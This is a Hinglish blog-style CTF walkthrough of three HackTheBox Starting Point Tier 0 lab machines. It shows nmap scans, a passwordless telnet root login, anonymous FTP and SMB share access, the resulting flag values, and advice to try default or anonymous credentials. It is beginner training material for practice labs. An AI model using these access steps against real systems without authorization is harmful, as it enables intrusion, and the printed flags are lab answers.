---
id: ctf-writeup-2026
title: CTF Writeup - HackTheBox Starting Point टियर 0
excerpt: HackTheBox Starting Point ke Tier 0 machines ka detailed CTF writeup. Hindi mein step-by-step walkthrough.
category: सीटीएफ
date: 2026-06-26
readTime: 15 मिनट
tags: सीटीएफ, हैकदबॉक्स, वॉकथ्रू, बिगिनर
featured: false
---

## CTF Walkthrough Series

Is series mein hum HackTheBox ki Starting Point machines ka walkthrough karenge. Tier 0 sabse easy machines hain jo beginners ke liye perfect hain.

## Machine 1: Meow

### Reconnaissance

```bash
nmap -sV -sC 10.129.1.10

PORT    STATE SERVICE VERSION
23/tcp  open  telnet  Linux telnetd
```

Sirf port 23 (Telnet) open hai. Telnet insecure protocol hai — no encryption.

### Exploitation

```bash
# Telnet connect karein
telnet 10.129.1.10

# Login: root (no password required!)
Username: root
# Direct shell mil gaya!
```

### Flag
```bash
cat flag.txt
# b40abdfe23665f766f9c61ecba8a4c19
```

## Machine 2: Fawn

### Reconnaissance

```bash
nmap -sV -sC 10.129.1.11

PORT    STATE SERVICE VERSION
21/tcp  open  ftp    vsftpd 3.0.3
```

FTP port 21 — vsftpd 3.0.3. Anonymous login try karte hain.

### Exploitation

```bash
ftp 10.129.1.11
# Username: anonymous
# Password: (blank)

ftp> ls
# flag.txt mil gaya

ftp> get flag.txt
# Download ho gaya!
```

### Flag
```bash
cat flag.txt
# 035db21c881520061c53e0536e44f815
```

## Machine 3: Dancing

### Reconnaissance

```bash
nmap -sV -sC 10.129.1.12

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

SMB ports — 135, 139, 445. Windows machine hai.

### Enumeration

```bash
# SMB shares check karein
smbclient -L //10.129.1.12 -N

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

### Exploitation

```bash
smbclient //10.129.1.12/WorkShares -N
smb: \> ls
smb: \> cd James.P
smb: \> get flag.txt
```

### Flag
```bash
cat flag.txt
# f751c19eda8f61ce81836e7d9ad5f75c
```

## Tips for HTB

1. **OpenVPN config download karein** Starting Point se
2. `sudo openvpn starting_point.ovpn` se connect karein
3. Nmap scan hamesha pehle karein
4. Anonymous / default credentials try karein
5. Google search karein agar atak jayein

## Tools Used

- Nmap
- Telnet
- FTP
- smbclient

## Conclusion

CTF competitions best practice hain. Starting Point se shuru karein, phir easy machines, phir medium. Practice makes perfect!
